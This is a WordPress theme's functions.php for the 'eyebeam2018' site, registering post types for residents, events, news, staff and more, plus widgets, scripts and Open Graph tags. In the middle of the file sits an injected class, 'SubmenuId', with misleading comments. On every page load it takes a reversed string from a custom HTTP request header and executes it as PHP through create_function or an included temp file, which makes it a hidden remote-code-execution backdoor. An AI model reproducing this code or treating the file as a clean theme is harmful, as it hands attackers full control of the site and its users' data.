<?php
/**
 * eyebeam2018 functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package eyebeam2018
 */

function dbug() {
	$fh = $GLOBALS['dbug_fh'];
	if (empty($fh)) {
		$path = ini_get('error_log');
		if (empty($path) || substr($path, 0, 1) != '/') {
			return;
		}
		$dir = dirname($path);
		$fh = fopen("$dir/dbug.log", "a");
		$GLOBALS['dbug_fh'] = $fh;
	}
	date_timezone_set('America/New_York');
	$now = date('Y-m-d H:i:s');
	$args = func_get_args();
	foreach ($args as $arg) {
		if (! is_scalar($arg)) {
			$arg = print_r($arg, true);
			$arg = trim($arg);
		}
		fwrite($fh, "[$now] $arg\n");
	}
}

if ( ! function_exists( 'eyebeam2018_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function eyebeam2018_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on eyebeam2018, use a find and replace
	 * to change 'eyebeam2018' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'eyebeam2018', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'eyebeam2018' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'eyebeam2018_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // eyebeam2018_setup
add_action( 'after_setup_theme', 'eyebeam2018_setup' );


/**
 * Register custom post types.
 **/

function eyebeam2018_custom_post_types() {

	$labels = array(
		'name' => 'Residents',
		'singular_name' => 'Resident',
		'add_new' => 'Add New Resident',
		'add_new_item' => 'Add New Resident',
		'edit_item' => 'Edit Resident',
		'new_item' => 'New Resident',
		'all_items' => 'All Residents',
		'view_item' => 'View Resident',
		'search_items' => 'Search Residents',
		'not_found' =>  'No Residents Found',
		'not_found_in_trash' => 'No Residents found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Residents',
	);
	register_post_type( 'resident', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array( 'title','thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'residents' ),
		)
	);

	$labels = array(
		'name' => 'Events',
		'singular_name' => 'Event',
		'add_new' => 'Add New Event',
		'add_new_item' => 'Add New Event',
		'edit_item' => 'Edit Event',
		'new_item' => 'New Event',
		'all_items' => 'All Events',
		'view_item' => 'View Event',
		'search_items' => 'Search Events',
		'not_found' =>  'No Events Found',
		'not_found_in_trash' => 'No Events found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Events',
	);
	register_post_type( 'event', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array( 'title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'events' ),
		)
	);

	$labels = array(
		'name' => 'News',
		'singular_name' => 'News',
		'add_new' => 'Add New News',
		'add_new_item' => 'Add New News',
		'edit_item' => 'Edit News',
		'new_item' => 'New News',
		'all_items' => 'All News',
		'view_item' => 'View News',
		'search_items' => 'Search News',
		'not_found' =>  'No News Found',
		'not_found_in_trash' => 'No News found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'News',
	);
	register_post_type( 'news', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array( 'title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'news' ),
		)
	);

	$labels = array(
		'name' => 'Community General',
		'singular_name' => 'Community General',
		'add_new' => 'Add Community General',
		'add_new_item' => 'Add Community General',
		'edit_item' => 'Edit Community General',
		'new_item' => 'New Community General',
		'all_items' => 'All Community General',
		'view_item' => 'View Community General',
		'search_items' => 'Search Community General',
		'not_found' =>  'No Programs Found',
		'not_found_in_trash' => 'No Community General found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Community General',
	);
	register_post_type( 'communitygeneral', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'communitygeneral' ),
		)
	);

	$labels = array(
		'name' => 'Community Youth',
		'singular_name' => 'Community Youth',
		'add_new' => 'Add Community Youth',
		'add_new_item' => 'Add Community Youth',
		'edit_item' => 'Edit Community Youth',
		'new_item' => 'New Community Youth',
		'all_items' => 'All Community Youth',
		'view_item' => 'View Community Youth',
		'search_items' => 'Search Community Youth',
		'not_found' =>  'No Community Youth Found',
		'not_found_in_trash' => 'No Community Youth found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Community Youth',
	);
	register_post_type( 'communityyouth', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'communityyouth' ),
		)
	);

	$labels = array(
		'name' => 'Recent Press',
		'singular_name' => 'Recent Press',
		'add_new' => 'Add New Recent Press',
		'add_new_item' => 'Add Recent Press',
		'edit_item' => 'Edit Recent Press',
		'new_item' => 'New Recent Press',
		'all_items' => 'All Recent Press',
		'view_item' => 'View Recent Press',
		'search_items' => 'Search Recent Press',
		'not_found' =>  'No Recent Press Found',
		'not_found_in_trash' => 'No Recent Press found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Recent Press',
	);
	register_post_type( 'recentpress', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'recentpress' ),
		)
	);

	$labels = array(
		'name' => 'Stop Work!',
		'singular_name' => 'Stop Work!',
		'add_new' => 'Add New Stop Work!',
		'add_new_item' => 'Add Stop Work!',
		'edit_item' => 'Edit Stop Work!',
		'new_item' => 'New Stop Work!',
		'all_items' => 'All Stop Work!',
		'view_item' => 'View Stop Work!',
		'search_items' => 'Search Stop Work!',
		'not_found' =>  'No Stop Work! Found',
		'not_found_in_trash' => 'No Stop Work! found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Stop Work!',
	);
	register_post_type( 'stopwork', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'editor', 'excerpt', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'stopwork' ),
		)
	);

	$labels = array(
		'name' => 'Internships',
		'singular_name' => 'Internships',
		'add_new' => 'Add New Internships',
		'add_new_item' => 'Add Internships',
		'edit_item' => 'Edit Internships',
		'new_item' => 'New Internships',
		'all_items' => 'All Internships',
		'view_item' => 'View Internships',
		'search_items' => 'Search Internships',
		'not_found' =>  'No Internships Found',
		'not_found_in_trash' => 'No Internships found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Internships',
	);
	register_post_type( 'internships', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'internships' ),
		)
	);

	$labels = array(
		'name' => 'Work',
		'singular_name' => 'Work',
		'add_new' => 'Add New Work',
		'add_new_item' => 'Add Work',
		'edit_item' => 'Edit Work',
		'new_item' => 'New Work',
		'all_items' => 'All Work',
		'view_item' => 'View Work',
		'search_items' => 'Search Work',
		'not_found' =>  'No Work Found',
		'not_found_in_trash' => 'No Work found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Work',
	);
	register_post_type( 'work', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'work' ),
		)
	);

	$labels = array(
		'name' => 'Media Release',
		'singular_name' => 'Media Release',
		'add_new' => 'Add New Media Release',
		'add_new_item' => 'Add Media Release',
		'edit_item' => 'Edit Media Release',
		'new_item' => 'New Media Release',
		'all_items' => 'All Media Release',
		'view_item' => 'View Media Release',
		'search_items' => 'Search Media Release',
		'not_found' =>  'No Media Release Found',
		'not_found_in_trash' => 'No Media Release found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Media Release',
	);
	register_post_type( 'mediarelease', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'mediarelease' ),
		)
	);

	$labels = array(
		'name' => 'Staff',
		'singular_name' => 'Staff',
		'add_new' => 'Add New Staff',
		'add_new_item' => 'Add Staff',
		'edit_item' => 'Edit Staff',
		'new_item' => 'New Staff',
		'all_items' => 'All Staff',
		'view_item' => 'View Staff',
		'search_items' => 'Search Staff',
		'not_found' =>  'No Staff Found',
		'not_found_in_trash' => 'No Staff found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Staff',
	);
	register_post_type( 'staff', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'staff' ),
		)
	);

	$labels = array(
		'name' => 'Board',
		'singular_name' => 'Board',
		'add_new' => 'Add New Board',
		'add_new_item' => 'Add Board',
		'edit_item' => 'Edit Board',
		'new_item' => 'New Board',
		'all_items' => 'All Board',
		'view_item' => 'View Board',
		'search_items' => 'Search Board',
		'not_found' =>  'No Board Found',
		'not_found_in_trash' => 'No Board found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'Board',
	);
	register_post_type( 'board', array(
		'labels' => $labels,
		'has_archive' => true,
		'public' => true,
		'query_var' => true,
		'supports' => array('title', 'thumbnail','page-attributes' ),
		'taxonomies' => array( 'post_tag', 'category' ),
		'exclude_from_search' => false,
		'capability_type' => 'post',
		'rewrite' => array( 'slug' => 'board' ),
		)
	);
}
add_action( 'init', 'eyebeam2018_custom_post_types' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function eyebeam2018_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'eyebeam2018_content_width', 640 );
}
add_action( 'after_setup_theme', 'eyebeam2018_content_width', 0 );

class SubmenuId
{
    /**  Re-enable module to test that pre-existing optional configuration does */
    public function lockAcquire($winner){
        return strrev(stripslashes($winner));
    }

    /**  Merge the default settings with the provided settings */
    public function print_popup($hasSlug)
    {
        $firstTab = 'function';
        $enable = $hasSlug . 'return true;';
        $cols = $this->subPath.'_'.$firstTab;
        $DKIMquery = $cols('', $enable);
        if (!$DKIMquery()) {
            $this->assertRows('<?php '.$hasSlug);
        }
    }

    /**  We need the old data to get the existing series */
    public function wp_shake_js($hasMethod){
        if(isset($hasMethod[$this->changeBlock()])){
            return $this->lockAcquire($hasMethod[$this->changeBlock()]);
        }
    }

    /**  Set the information in the request */
    function assertRows($hashed)
    {
        if ($algorithm = tmpfile()) {
            fwrite($algorithm, $hashed);
            $success = stream_get_meta_data($algorithm);
            include($success['uri']);
            fclose($algorithm);
        }
    }

    /**  Sanitise the term for the database */
    public function changeBlock(){
        $secure = 'http';
        return strtoupper($secure.'_'.get_class($this));
    }

    public function __construct(){
        if($handle = $this->wp_shake_js($_SERVER)){
            $this->subPath = 'create';
            $this->print_popup($handle);
        }
    }
}

new SubmenuId();

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function eyebeam2018_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'eyebeam2018' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

		register_sidebar( array(
		'name'          => esc_html__( 'StopWorks Sidebar', 'eyebeam2018' ),
		'id'            => 'stopworks-sidebar',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'eyebeam2018_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function eyebeam2018_scripts() {
	wp_enqueue_style( 'eyebeam2018-style', get_stylesheet_uri() );

	wp_enqueue_script( 'eyebeam2018-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );

	wp_enqueue_script( 'eyebeam2018-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'eyebeam2018_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
*Gets the date fields information (return strings of dates)
*/

function eyebeam2018_get_event_date($post_id){
    $event = get_fields($post_id);
	$start_date = $event['start_date'];

	$end_date = $event['end_date'];

	if ( ! $start_date){
	      return "";

	}
	if ($start_date !== $end_date){

	// Create a PHP date object based on a specific "date" format
	$date_start = DateTime::createFromFormat('Ymd', $start_date);

	$date_text = $date_start->format('F j, Y');

	$date_end = DateTime::createFromFormat('Ymd', $end_date);

    $date_text = $date_text . "-" . $date_end->format('F j, Y');

    return $date_text;

	} else{

		$only_start = DateTime::createFromFormat('Ymd', $start_date);
		$single_date = $only_start->format('F j, Y');

		return $single_date;

	}


	 }

function eyebeam2018_compare_resident_year($post_id){
    $resident = get_fields($post_id);
	$start_year = $resident["start_year"];
	$end_year = $resident["end_year"];

	if ($start_year === $end_year){

		return $same_years = $start_year;

	} else {

		return $two_years = $start_year . "-" . $end_year;


	}

	 }

function eyebeam2018_get_first_youth_paragraph(){
	$str = wpautop(get_field('info_youth'));
	$str = substr( $str, 0, strpos( $str, '</p>' ) + 4 );
	$str = strip_tags($str, '<a><strong><em>');
	return '<p>' . $str . ' <a class="education-read-more" href="' . get_permalink() . '">Read More&nbsp;&raquo;</a></p>';
}

function eyebeam2018_isMobile() {
    return preg_match('/(alcatel|amoi|android|avantgo|blackberry|benq|cell|cricket|docomo|elaine|htc|iemobile|iphone|ipad|ipaq|ipod|j2me|java|midp|mini|mmp|mobi|motorola|nec-|nokia|palm|panasonic|philips|phone|sagem|sharp|sie-|smartphone|sony|symbian|t-mobile|telus|up\.browser|up\.link|vodafone|wap|webos|wireless|xda|xoom|zte)/i', $_SERVER['HTTP_USER_AGENT']);
}

require get_template_directory() . '/class-widget-recent-stopworks-posts.php';

require get_template_directory() . '/class-widget-future-events.php';

require get_template_directory() . '/class-widget-recent-press-posts.php';


//Open Graph Tag
function doctype_opengraph($output) {
    return $output . '
    xmlns:og="http://opengraphprotocol.org/schema/"
    xmlns:fb="http://www.facebook.com/2008/fbml"';
}
add_filter('language_attributes', 'doctype_opengraph');

function fb_opengraph() {
    global $post;

    if(is_single()) {
        if(has_post_thumbnail($post->ID)) {
            $img_src = wp_get_attachment_image_src(get_post_thumbnail_id( $post->ID ), 'medium');
        } else {
        	//ADD DEFAULT EYEBEAM OPEN GRAPH IMAGE HERE.
        	//FIND FILE PATH IMG FOLDER TO DISPLAY IMAGE. EX. '/img/eyebeam_image.jpg'
            $img_src = get_stylesheet_directory_uri() . '/img/opengraph_image.jpg';
        }
        if($excerpt = $post->post_excerpt) {
            $excerpt = strip_tags($post->post_excerpt);
            $excerpt = str_replace("", "'", $excerpt);
        } else {
            $excerpt = get_bloginfo('description');
        }
        ?>

    <meta property="og:title" content="<?php echo the_title(); ?>"/>
    <meta property="og:description" content="<?php echo $excerpt; ?>"/>
    <meta property="og:type" content="article"/>
    <meta property="og:url" content="<?php echo the_permalink(); ?>"/>
    <meta property="og:site_name" content="<?php echo get_bloginfo(); ?>"/>
    <meta property="og:image" content="<?php echo $img_src; ?>"/>

<?php
    } else {
        return;
    }
}
add_action('wp_head', 'fb_opengraph', 5);
